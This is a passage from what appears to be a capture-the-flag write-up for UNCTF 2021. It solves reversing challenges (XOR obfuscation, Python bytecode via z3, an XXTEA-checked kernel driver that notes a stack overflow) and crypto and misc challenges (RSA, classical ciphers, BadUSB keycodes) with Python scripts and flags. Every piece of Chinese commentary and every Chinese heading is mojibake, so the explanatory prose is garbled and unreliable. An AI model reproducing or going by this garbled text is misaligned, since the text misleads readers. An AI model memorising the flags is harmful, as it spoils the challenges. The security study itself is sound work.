<code>pqsd`fl&#123;zmpZsag&#125;wdYVkUNC</code> ä¸ <code>0x16</code> å¼‚æˆ–å¾—åˆ° <code>fgervpzml&#123;fLewqkarO@&#125;CXU</code>ï¼Œå†8ä½ä¸€ç»„ä¸Šä¸‹æ’åˆ—ï¼Œä»ä¸Šå¾€ä¸‹å–å‡ºè¿æˆï¼š<code>flag&#123;refOrL@ve&#125;pwCzqXmkU</code>ã€‚</p><p>flagï¼š<code>flag&#123;refOrL@ve&#125;</code></p><p>â€‹    </p><h3 id="rejunk"><a href="#rejunk" class="headerlink" title="rejunk"></a>rejunk</h3><blockquote><p>åƒåœ¾ä»£ç æ··æ·†ï¼Œå¼‚æˆ–ç®—æ³•é€†å‘</p></blockquote><p>æŸ¥çœ‹ä¼ªä»£ç å‘ç°å¤¹è¿›å¾ˆå¤šåƒåœ¾ä»£ç ï¼Œè·Ÿè¿›å‡ è¡Œæœ‰ç”¨çš„ä»£ç ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">__main();</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;input your answer:&quot;</span>);</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, v14);</span><br><span class="line"><span class="built_in">sprintf</span>(Buffer, <span class="string">&quot;%s%s%s%s&quot;</span>, <span class="string">&quot;WQGUL&quot;</span>, <span class="string">&quot;xb&gt;2:&quot;</span>, <span class="string">&quot;ooh95=&quot;</span>, <span class="string">&quot;&#x27;&#x27;twk&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> ( (v9 ^ (v14[v9] + <span class="number">2</span>)) != Buffer[v9] )</span><br><span class="line">      <span class="keyword">break</span>;</span><br></pre></td></tr></table></figure><p>è„šæœ¬é€†è§£ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">s = <span class="built_in">list</span>(<span class="string">b&#x27;&#x27;&#x27;WQGULxb&gt;2:ooh95=&#x27;&#x27;twk&#x27;&#x27;&#x27;</span>)</span><br><span class="line">t = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(s)):</span><br><span class="line">    t.append((s[i]^i)-<span class="number">2</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>(t))</span><br><span class="line"></span><br><span class="line"><span class="comment"># b&#x27;UNCTF&#123;b781cbb29054db&#125;&#x27;</span></span><br></pre></td></tr></table></figure><p>flagï¼š<code>UNCTF&#123;b781cbb29054db&#125;</code></p><p>â€‹    </p><h3 id="py-trade"><a href="#py-trade" class="headerlink" title="py_trade"></a>py_trade</h3><blockquote><p>EZ opcode! Give me your PY, and iâ€™ll give you flag!</p></blockquote><p>è¿˜åŸpythonå­—èŠ‚ç ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">flag = <span class="string">&#x27;XXXXXX&#x27;</span></span><br><span class="line">num = [<span class="number">0</span>]*<span class="number">18</span></span><br><span class="line">k = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(flag)):</span><br><span class="line">    num[i] = (<span class="built_in">ord</span>(flag[i])+i)^(k%<span class="number">3</span>+<span class="number">1</span>)</span><br><span class="line">    num[<span class="built_in">len</span>(flag)-i-<span class="number">1</span>] = (<span class="built_in">ord</span>(flag[<span class="built_in">len</span>(flag)-i-<span class="number">1</span>])+<span class="built_in">len</span>(flag)-i-<span class="number">1</span>)^(k%<span class="number">3</span>+<span class="number">1</span>)</span><br><span class="line">    k += <span class="number">1</span></span><br><span class="line"><span class="built_in">print</span>(num)</span><br><span class="line"><span class="comment">#[115, 120, 96, 84, 116, 103, 105, 56, 102, 59, 127, 105, 115, 128, 95, 124, 139, 49]</span></span><br></pre></td></tr></table></figure><p>ç”¨z3è§£ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line">s = Solver()</span><br><span class="line">num = [<span class="number">115</span>, <span class="number">120</span>, <span class="number">96</span>, <span class="number">84</span>, <span class="number">116</span>, <span class="number">103</span>, <span class="number">105</span>, <span class="number">56</span>, <span class="number">102</span>, <span class="number">59</span>, <span class="number">127</span>, <span class="number">105</span>, <span class="number">115</span>, <span class="number">128</span>, <span class="number">95</span>, <span class="number">124</span>, <span class="number">139</span>, <span class="number">49</span>]</span><br><span class="line">flag = [BitVec(<span class="string">&#x27;flag%d&#x27;</span>%i,<span class="number">8</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(num))]</span><br><span class="line">res = [-<span class="number">1</span>]*<span class="built_in">len</span>(num)</span><br><span class="line"></span><br><span class="line">k = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(num)):</span><br><span class="line">    res[i] = (flag[i]+i)^(k%<span class="number">3</span>+<span class="number">1</span>)</span><br><span class="line">    res[<span class="built_in">len</span>(flag)-i-<span class="number">1</span>] = (flag[<span class="built_in">len</span>(flag)-i-<span class="number">1</span>]+<span class="built_in">len</span>(flag)-i-<span class="number">1</span>)^(k%<span class="number">3</span>+<span class="number">1</span>)</span><br><span class="line">    k += <span class="number">1</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(num)):</span><br><span class="line">    s.add(res[i]==num[i])</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> s.check() == sat:</span><br><span class="line">    m = s.model()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;&#x27;</span>.join(<span class="built_in">chr</span>(m[i].as_long()) <span class="keyword">for</span> i <span class="keyword">in</span> flag))</span><br><span class="line">    </span><br><span class="line"><span class="comment"># py_Trad3_1s_fuNny!</span></span><br></pre></td></tr></table></figure><p>flagï¼š<code>unctf&#123;py_Trad3_1s_fuNny!&#125;</code></p><p>â€‹    </p><h3 id="ezDriver"><a href="#ezDriver" class="headerlink" title="ezDriver"></a>ezDriver</h3><blockquote><p>ä½ äº†è§£è¿‡é©±åŠ¨å˜›ï¼Ÿè¯•è¯•çœ‹å§ï¼</p></blockquote><p>åˆ†æé€»è¾‘ï¼Œ<code>DriverEntry()</code> -&gt; <code>sub_140086000()</code> -&gt; <code>sub_140085268()</code> -&gt; <code>sub_140085000()</code> -&gt; <code>sub_140085020()</code>ã€‚</p><p>ä¸»ç¨‹åºé€»è¾‘åœ¨ <code>sub_140085020()</code>ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">sub_140085020</span><span class="params">(<span class="keyword">volatile</span> <span class="keyword">void</span> *Address, __int64 a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v4; <span class="comment">// ecx</span></span><br><span class="line">  __int64 v5; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v6; <span class="comment">// r8</span></span><br><span class="line">  <span class="keyword">int</span> v8; <span class="comment">// ecx</span></span><br><span class="line">  __int64 v9; <span class="comment">// [rsp+20h] [rbp-828h]</span></span><br><span class="line">  <span class="keyword">char</span> v10[<span class="number">2048</span>]; <span class="comment">// [rsp+30h] [rbp-818h] BYREF</span></span><br><span class="line"></span><br><span class="line">  sub_140001640(v10, <span class="number">0</span>i64, <span class="number">2048</span>i64);</span><br><span class="line">  ProbeForRead(Address, <span class="number">0x800</span>ui64, <span class="number">1u</span>);</span><br><span class="line">  DbgPrintEx(<span class="number">0x4D</span>u, <span class="number">3u</span>, <span class="string">&quot;[+] UserBuffer: 0x%p\n&quot;</span>, (<span class="keyword">const</span> <span class="keyword">void</span> *)Address);</span><br><span class="line">  DbgPrintEx(<span class="number">0x4D</span>u, <span class="number">3u</span>, <span class="string">&quot;[+] UserBuffer Size: 0x%zX\n&quot;</span>, a2);</span><br><span class="line">  DbgPrintEx(<span class="number">0x4D</span>u, <span class="number">3u</span>, <span class="string">&quot;[+] KernelBuffer: 0x%p\n&quot;</span>, v10);</span><br><span class="line">  DbgPrintEx(<span class="number">0x4D</span>u, <span class="number">3u</span>, <span class="string">&quot;[+] KernelBuffer Size: 0x%zX\n&quot;</span>, <span class="number">0x800</span>ui64);</span><br><span class="line">  v4 = <span class="number">0</span>;</span><br><span class="line">  LODWORD(v9) = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">while</span> ( (<span class="keyword">unsigned</span> __int64)v4 &lt; <span class="number">0x200</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    byte_140083090[v4] = v10[<span class="number">4</span> * v4];</span><br><span class="line">    LODWORD(v9) = ++v4;</span><br><span class="line">  &#125;</span><br><span class="line">  sub_140001000(byte_140083090, (<span class="keyword">unsigned</span> <span class="keyword">int</span>)dword_140003028, &amp;unk_140003030);<span class="comment">// XXTEAåŠ å¯†</span></span><br><span class="line">  v5 = <span class="number">-1</span>i64;</span><br><span class="line">  v6 = <span class="number">-1</span>i64;</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">    ++v6;</span><br><span class="line">  <span class="keyword">while</span> ( byte_140003000[v6] );</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">    ++v5;</span><br><span class="line">  <span class="keyword">while</span> ( byte_140083090[v5] );</span><br><span class="line">  <span class="keyword">if</span> ( v5 == v6 )</span><br><span class="line">  &#123;</span><br><span class="line">    v8 = <span class="number">0</span>;</span><br><span class="line">    HIDWORD(v9) = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> ( v8 &lt; v6 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( byte_140003000[v8] != byte_140083090[v8] )<span class="comment">// æ¯”è¾ƒ</span></span><br><span class="line">      &#123;</span><br><span class="line">        DbgPrintEx(<span class="number">0x4D</span>u, <span class="number">3u</span>, <span class="string">&quot;[*] flag wrong!&quot;</span>, byte_140003000, v9);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>i64;</span><br><span class="line">      &#125;</span><br><span class="line">      HIDWORD(v9) = ++v8;</span><br><span class="line">    &#125;</span><br><span class="line">    DbgPrintEx(<span class="number">0x4D</span>u, <span class="number">3u</span>, <span class="string">&quot;[*] you are right@&quot;</span>, byte_140003000, v9);</span><br><span class="line">    DbgPrintEx(<span class="number">0x4D</span>u, <span class="number">3u</span>, <span class="string">&quot;[+] Triggering Buffer Overflow in Stack\n&quot;</span>);</span><br><span class="line">    sub_140001380(v10, Address, a2);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>i64;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    DbgPrintEx(<span class="number">0x4D</span>u, <span class="number">3u</span>, <span class="string">&quot;[*] flag Wrong!&quot;</span>, byte_140003000, v9);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>i64;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å‘ç°é€šè¿‡åŠ å¯†å‡½æ•° <code>sub_140001000()</code> åï¼Œå¾—åˆ°çš„ç»“æœ <code>byte_140083090</code> ä¸ <code>byte_140003000</code> ä½œæ¯”è¾ƒã€‚</p><p>è·Ÿè¿›åŠ å¯†å‡½æ•° <code>sub_140001000()</code>ï¼Œç”±ç‰¹å¾çŸ¥ä¸ºXXTEAåŠ å¯†ç®—æ³•ï¼Œä½¿ç”¨çš„keyä¸º <code>unk_140003030=[1,2,3,4]</code>ã€‚</p><p>è„šæœ¬è§£å¯†ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">shift</span>(<span class="params">z, y, x, k, p, e</span>):</span></span><br><span class="line">    <span class="keyword">return</span> ((((z &gt;&gt; <span class="number">5</span>) ^ (y &lt;&lt; <span class="number">2</span>)) + ((y &gt;&gt; <span class="number">3</span>) ^ (z &lt;&lt; <span class="number">4</span>))) ^ ((x ^ y) + (k[(p &amp; <span class="number">3</span>) ^ e] ^ z)))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decrypt</span>(<span class="params">v, k</span>):</span></span><br><span class="line">    delta = <span class="number">0x9E3779B9</span></span><br><span class="line">    n = <span class="built_in">len</span>(v)</span><br><span class="line">    rounds = <span class="number">6</span> + <span class="number">52</span> // n</span><br><span class="line">    x = (rounds * delta) &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">    y = v[<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(rounds):</span><br><span class="line">        e = (x &gt;&gt; <span class="number">2</span>) &amp; <span class="number">3</span></span><br><span class="line">        <span class="keyword">for</span> p <span class="keyword">in</span> <span class="built_in">range</span>(n - <span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>):</span><br><span class="line">            z = v[p - <span class="number">1</span>]</span><br><span class="line">            v[p] = (v[p] - shift(z, y, x, k, p, e)) &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">            y = v[p]</span><br><span class="line">        p -= <span class="number">1</span></span><br><span class="line">        z = v[n - <span class="number">1</span>]</span><br><span class="line">        v[<span class="number">0</span>] = (v[<span class="number">0</span>] - shift(z, y, x, k, p, e)) &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">        y = v[<span class="number">0</span>]</span><br><span class="line">        x = (x - delta) &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">    <span class="keyword">return</span> v</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    key = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>]</span><br><span class="line">    s = <span class="string">&#x27;184E8E7F2E69B702EEAA503990DEE59FAE4C4D06937164208B0234B83CA1884A21671A3783D1F2B1&#x27;</span></span><br><span class="line">    s = [s[<span class="number">8</span>*k:<span class="number">8</span>*k+<span class="number">8</span>] <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(s)//<span class="number">8</span>)]</span><br><span class="line">    s = [<span class="built_in">bytes</span>.fromhex(k)[::-<span class="number">1</span>].<span class="built_in">hex</span>() <span class="keyword">for</span> k <span class="keyword">in</span> s]</span><br><span class="line">    encrypted = [<span class="built_in">int</span>(k,<span class="number">16</span>) <span class="keyword">for</span> k <span class="keyword">in</span> s]</span><br><span class="line">    decrypted = decrypt(encrypted, key)</span><br><span class="line">    decrypted = [<span class="built_in">hex</span>(k)[<span class="number">2</span>:] <span class="keyword">for</span> k <span class="keyword">in</span> decrypted][:-<span class="number">1</span>]</span><br><span class="line">    flag = [<span class="built_in">bytes</span>.fromhex(k)[::-<span class="number">1</span>] <span class="keyword">for</span> k <span class="keyword">in</span> decrypted]</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">b&#x27;&#x27;</span>.join(flag))</span><br><span class="line"></span><br><span class="line"><span class="comment"># b&#x27;unctf&#123;Do_you_want_to_a_cup_of_tea?&#125;&#x27;</span></span><br></pre></td></tr></table></figure><p>flagï¼š<code>unctf&#123;Do_you_want_to_a_cup_of_tea?&#125;</code></p><p>â€‹    </p><h2 id="Crypto"><a href="#Crypto" class="headerlink" title="# Crypto"></a># Crypto</h2><h3 id="easy-rsa"><a href="#easy-rsa" class="headerlink" title="easy_rsa"></a>easy_rsa</h3><blockquote><p>ç®€å•çš„RSA</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">q= <span class="number">9961202707366965556741565662110710902919441271996809241009358666778850435448710324711706845973820669201482939820488174382325795134659313309606698334978471</span></span><br><span class="line">p= <span class="number">12525187149887628510447403881107442078833803097302579419605689530714690308437476207855511625840027119860834633695330551080761572835309850579517639206740101</span></span><br><span class="line">c= <span class="number">28587419802025513525354713621431206010395084854419372005671024739235625817936539010481222419824634956610184430308528941304950093228826213143262329902946812513518444587906469224383320964300417189270202019231856531012143472434842753891213128487132962453421971000901646523331476667655739056951415917218673801225</span></span><br><span class="line">e = <span class="number">65537</span></span><br></pre></td></tr></table></figure></blockquote><p>RSAåŸºæ“ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">q = <span class="number">9961202707366965556741565662110710902919441271996809241009358666778850435448710324711706845973820669201482939820488174382325795134659313309606698334978471</span></span><br><span class="line">p =  <span class="number">12525187149887628510447403881107442078833803097302579419605689530714690308437476207855511625840027119860834633695330551080761572835309850579517639206740101</span></span><br><span class="line">c = <span class="number">28587419802025513525354713621431206010395084854419372005671024739235625817936539010481222419824634956610184430308528941304950093228826213143262329902946812513518444587906469224383320964300417189270202019231856531012143472434842753891213128487132962453421971000901646523331476667655739056951415917218673801225</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line">fn = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">d = gmpy2.invert(e,fn)</span><br><span class="line">m = <span class="built_in">pow</span>(c,d,p*q)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>.fromhex(<span class="built_in">hex</span>(m)[<span class="number">2</span>:]))</span><br><span class="line"></span><br><span class="line"><span class="comment"># b&#x27;UNCTF&#123;Th1s_1s_f1ag_f0r_unctf_2021!!&#125;&#x27;</span></span><br></pre></td></tr></table></figure><p>â€‹    </p><h3 id="æ¢ç§˜ä¸­ä¸–çºªåŸå ¡"><a href="#æ¢ç§˜ä¸­ä¸–çºªåŸå ¡" class="headerlink" title="æ¢ç§˜ä¸­ä¸–çºªåŸå ¡"></a>æ¢ç§˜ä¸­ä¸–çºªåŸå ¡</h3><blockquote><p>è´æ‹‰åœ¨å‚è§‚ä¸€ä¸ªä¸­ä¸–çºªçš„å¤å ¡æ—¶ï¼Œåœ¨æ¡Œä¸Šçœ‹åˆ°äº†ä¸€ä¸²ä¸€å¥‡æ€ªçš„å­—ç¬¦å’Œæè¿°ã€‚ä½ èƒ½å¸®å¤§èªæ˜ç ´è§£çš‡çˆéª‘å£«ç•™ä¸‹æ¥çš„è°œå›¢å—ï¼Ÿ</p><p>å¹´è½»çš„å¤§å¸ç‡é¢†ç€64ä½çš‡çˆéª‘å£«å†²ç ´äº†åŒé‡é˜»æ å¤ºä¸‹äº†åŸæ± ã€‚<br>AZSLh2OofBA0C2qzi25mg2KsYqW7iCSdDq9aBLKsDBWyi259</p></blockquote><p>ROT21+base64+æ …æ 2ã€‚</p><p>flagï¼š<code>UNCTF&#123;subscribe_to_Xiangwandamowang&#125;</code></p><p>â€‹    </p><h3 id="åˆ†æbadusbæµé‡"><a href="#åˆ†æbadusbæµé‡" class="headerlink" title="åˆ†æbadusbæµé‡"></a>åˆ†æbadusbæµé‡</h3><blockquote><p>ä¸€æ—¥ï¼ŒæŸä¼ä¸šçš„å®‰å…¨ç®¡ç†å‘˜å‘ç°ä¼ä¸šä¸­çš„ç”µè„‘é­åˆ°äº†badusbçš„ä¾µå®³ï¼Œä»¥ä¸‹ä»–åˆ†ç¦»å‡ºæ¥çš„æœ‰é—®é¢˜USBæµé‡ï¼Œè€Œè¿™ä¼¼ä¹è·Ÿé”®ç›˜çš„é”®ä½æ˜ å°„æœ‰å…³ã€‚</p><p>2018 2011 2006 2017 2009 202f 201C 0027 0018 002D 2004 0015 0008 002D 0019 0008 0015 001C 002D 0011 001E 0006 0008 2030</p></blockquote><p>é”®ç›˜é”®ä½æ˜ å°„è§„åˆ™ï¼Œæ˜ å°„å…³ç³»å‚è€ƒ<a href="https://wenku.baidu.com/view/9050c3c3af45b307e971971e.html">ã€ŠUSBé”®ç›˜åè®®ä¸­é”®ç ã€‹ä¸­çš„HID Usage ID</a>ã€‚</p><p>å‰ä¸¤ä½20ä»£è¡¨å¤§å†™ï¼Œ10ä»£è¡¨å°å†™ï¼Œåä¸¤ä½ä¸ºé”®ç ï¼Œå¯¹ç…§å†™flagã€‚</p><p>flagï¼š<code>UNCTF&#123;Y0u-Are-very-n1ce&#125;</code></p><p>â€‹    </p><h3 id="baby-rsa"><a href="#baby-rsa" class="headerlink" title="baby_rsa"></a>baby_rsa</h3><blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line">flag=<span class="string">&quot;unctf&#123;&quot;</span>+<span class="built_in">str</span>(uuid.uuid4())+<span class="string">&quot;&#125;&quot;</span></span><br><span class="line">m=libnum.s2n(flag)</span><br><span class="line"></span><br><span class="line">p=libnum.generate_prime(<span class="number">1024</span>)</span><br><span class="line">q=libnum.generate_prime(<span class="number">1024</span>)</span><br><span class="line">n=p*q</span><br><span class="line">e=<span class="number">65537</span></span><br><span class="line">c=<span class="built_in">pow</span>(m*p+n,e,n)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;n=&quot;</span>,n)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;c=&quot;</span>,c)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;e=&quot;</span>,e)</span><br><span class="line"><span class="comment">#n= 27023180567533176673625876001733765250439008888496677405372613659387969480500400831799338479404533734632060401129194207025095826786316107611502577395964365591899893794206238112244571942694129959717225168573059987542436467778426312967832431595178558711258027999897974942046398583397445299861338203860420721585460676138091828032223153425728023656897880166788811969523526091221520293020106530587453637600349533427641518473788620430866128331962450325767202417824455886116760280239705754222948387172102353564657340216229891342124971948458724351338597649821310431397426705701275774039588035776573373417654649168810548916141</span></span><br><span class="line"><span class="comment">#c= 3489599657527403893851973553294684608504140532554562294027722218597464669848608337663997115805201027340092733823019661706872544231209523772845492398492677185660213963118144668038183924970370481476141221609706208064428560732214361469135212057355342825193598971775551833240699393482839422273480793244841531126642199202744610656153155545415859410361595564197685655133074582118230993519133935533313364233668337427608419528430102794052261190930670933657287272452581248934890029409559234507626012423255430699687038808658327174609660874748540185589263800447650242593224189976058739054174360024536594384447518687126891675059</span></span><br><span class="line"><span class="comment">#e= 65537</span></span><br></pre></td></tr></table></figure></blockquote><p>$c = (mp+n)^e \% n = p^e(m+q)^e \% n $ï¼Œ</p><p>æœ‰ $c\%p = p^e(m+q)^e \% p = \Big((p^e \% p)\big((m+q)^e \% p\big)\Big) \% p=0$ï¼Œ</p><p>æ•… $c=kp$ï¼Œåˆ $n=pq$ï¼Œåˆ™ $p=\gcd(c,n)$ã€‚</p><p>æ±‚å‡º $d \equiv e^{-1} \pmod {\varphi(n)}$ï¼Œå¯ä»¥å¾—åˆ° $mâ€™ = mp+n = c^d \% n$ï¼Œæ‰€ä»¥ $m = \cfrac{mâ€™-n}{p}$ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">n = <span class="number">27023180567533176673625876001733765250439008888496677405372613659387969480500400831799338479404533734632060401129194207025095826786316107611502577395964365591899893794206238112244571942694129959717225168573059987542436467778426312967832431595178558711258027999897974942046398583397445299861338203860420721585460676138091828032223153425728023656897880166788811969523526091221520293020106530587453637600349533427641518473788620430866128331962450325767202417824455886116760280239705754222948387172102353564657340216229891342124971948458724351338597649821310431397426705701275774039588035776573373417654649168810548916141</span></span><br><span class="line">c = <span class="number">3489599657527403893851973553294684608504140532554562294027722218597464669848608337663997115805201027340092733823019661706872544231209523772845492398492677185660213963118144668038183924970370481476141221609706208064428560732214361469135212057355342825193598971775551833240699393482839422273480793244841531126642199202744610656153155545415859410361595564197685655133074582118230993519133935533313364233668337427608419528430102794052261190930670933657287272452581248934890029409559234507626012423255430699687038808658327174609660874748540185589263800447650242593224189976058739054174360024536594384447518687126891675059</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">p = gcd(n,c)</span><br><span class="line">q = n//p</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line">fn = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">d = gmpy2.invert(e,fn)</span><br><span class="line">m = <span class="built_in">int</span>(<span class="built_in">pow</span>(c,d,n)-n)//p</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>.fromhex(<span class="built_in">hex</span>(m)[<span class="number">2</span>:]))</span><br><span class="line"></span><br><span class="line"><span class="comment"># b&#x27;unctf&#123;rsa_s1mp1e_0kk&#125;&#x27;</span></span><br></pre></td></tr></table></figure><p>flagï¼š<code>unctf&#123;rsa_s1mp1e_0kk&#125;</code></p><p>â€‹    </p><h3 id="ç”µä¿¡è¯ˆéª—pro"><a href="#ç”µä¿¡è¯ˆéª—pro" class="headerlink" title="ç”µä¿¡è¯ˆéª—pro"></a>ç”µä¿¡è¯ˆéª—pro</h3><blockquote><p>æœ•æ˜¯ç§¦å§‹çš‡ï¼Œå…¶å®æœ•æ²¡æœ‰æ­»ï¼Œæœ•åœ¨è¥¿å®‰å…µé©¬ä¿‘ç¬¬å››ä¸ªå‘ç¬¬ä¸ƒæ’ï¼Œæœ•æ˜¯åƒäº†é•¿ç”Ÿä¸è€è¯çš„ï¼Œæœ•å‘Šè¯‰ä½ å•Šï¼Œæœ•åœ¨é™•è¥¿æœ‰3000å¨é»„é‡‘å’Œ300ä¸‡ç§¦å…µè¢«å°å°ï¼Œç°åœ¨åªéœ€è¦30å…ƒå°±èƒ½è§£å°ï¼Œåªè¦ä½ 